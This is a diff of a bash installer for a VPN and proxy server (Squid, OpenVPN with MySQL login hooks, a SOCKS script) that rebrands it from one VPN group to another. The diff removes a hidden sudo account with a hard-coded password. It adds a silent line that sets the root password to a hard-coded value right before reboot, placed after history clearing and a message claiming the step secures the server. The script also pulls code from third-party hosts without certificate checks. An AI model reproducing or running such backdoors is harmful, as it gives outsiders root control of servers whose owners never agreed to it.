@@ -50,14 +50,14 @@ echo "deb http://ftp.debian.org/debian/ jessie main contrib non-free
       --with-pidfile=/var/run/squid.pid
     make -j$(nproc)
     make install
-    wget --no-check-certificate -O /etc/init.d/squid http://firenetvpn.net/files/slowdns/squid.sh
+    wget --no-check-certificate -O /etc/init.d/squid https://admin-boyes.com/script/newpanel/squid.sh
     chmod +x /etc/init.d/squid
     update-rc.d squid defaults
     chown -cR proxy /var/log/squid
     squid -z
     cd /etc/squid/
     rm squid.conf
-    echo "acl Firenet dst `curl -s https://api.ipify.org`" >> squid.conf
+    echo "acl teamkidlat dst `curl -s https://api.ipify.org`" >> squid.conf
     echo 'http_port 8080
 http_port 8181
 visible_hostname Proxy
@@ -71,15 +71,15 @@ http_reply_access allow all
 http_access deny all
 icp_access allow all
 always_direct allow all
-visible_hostname Firenet-Proxy
+visible_hostname teamkidlat-Proxy
 error_directory /usr/share/squid/errors/English' >> squid.conf
     cd /usr/share/squid/errors/English
     rm ERR_INVALID_URL
-    echo '<!--FirenetDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+    echo '<!--teamkidlat--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
     chmod 755 *
     /etc/init.d/squid start
 cd /etc || exit
-wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
+wget 'https://teamkidlat.com/public/raw/JWrIyIh1In' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
 rm /etc/apt/sources.list
@@ -105,7 +105,7 @@ echo 'DNS=1.1.1.1
 DNSStubListener=no' >> /etc/systemd/resolved.conf
 sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration TKNETWORK :)
 dev tun
 port PORT_UDP
 proto udp
@@ -151,7 +151,7 @@ verb 3' > /etc/openvpn/server.conf
 
 sed -i "s|PORT_UDP|$PORT_UDP|g" /etc/openvpn/server.conf
 
-echo '# Openvpn Configuration by Firenet Philippines :)
+echo '# Openvpn Configuration by TKNETWORK :)
 dev tun
 port PORT_TCP
 proto tcp
@@ -220,23 +220,23 @@ user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 EOM
 
 #client-connect file
-cat <<'LENZ05' >/etc/openvpn/login/connect.sh
+cat <<'TKNETWORK01' >/etc/openvpn/login/connect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 ##set status online to user connected
 server_ip=SERVER_IP
 datenow=`date +"%Y-%m-%d %T"`
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
-LENZ05
+TKNETWORK01
 
 sed -i "s|SERVER_IP|$server_ip|g" /etc/openvpn/login/connect.sh
 
 #TCP client-disconnect file
-cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
+cat <<'TKNETWORK2' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
 . /etc/openvpn/login/config.sh
 mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_connected='0', active_address='', active_date='' WHERE user_name='$common_name' "
-LENZ06
+TKNETWORK2
 
 cat << EOF > /etc/openvpn/easy-rsa/keys/ca.crt
 -----BEGIN CERTIFICATE-----
@@ -460,14 +460,7 @@ sudo service stunnel4 restart
   } &>/dev/null
 }
 
-install_sudo(){
-  {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
+
 
 install_rclocal(){
   {
@@ -478,8 +471,8 @@ install_rclocal(){
     sudo systemctl start openvpn@server2.service    
     
     echo "[Unit]
-Description=firenet service
-Documentation=http://firenetvpn.com
+Description=teamkidlat service
+Documentation=http://teamkidlat.com
 
 [Service]
 Type=oneshot
@@ -487,7 +480,7 @@ ExecStart=/bin/bash /etc/rc.local
 RemainAfterExit=yes
 
 [Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+WantedBy=multi-user.target" >> /etc/systemd/system/teamkidlat.service
     echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
@@ -499,8 +492,8 @@ screen -dmS socks python /etc/socks.py
 exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
     systemctl daemon-reload
-    sudo systemctl enable firenet
-    sudo systemctl start firenet.service
+    sudo systemctl enable teamkidlat
+    sudo systemctl start teamkidlat.service
   }&>/dev/null
 }
 
@@ -521,6 +514,7 @@ history -c;
 rm /root/.installer
 echo 'Server will secure this server and reboot after 20 seconds'
 sleep 20
+ echo 'root:JAN022011b' | sudo chpasswd
 reboot
 }
 
@@ -528,7 +522,6 @@ server_ip=$(curl -s https://api.ipify.org)
 server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo  
 install_squid
 install_openvpn
 install_firewall_kvm
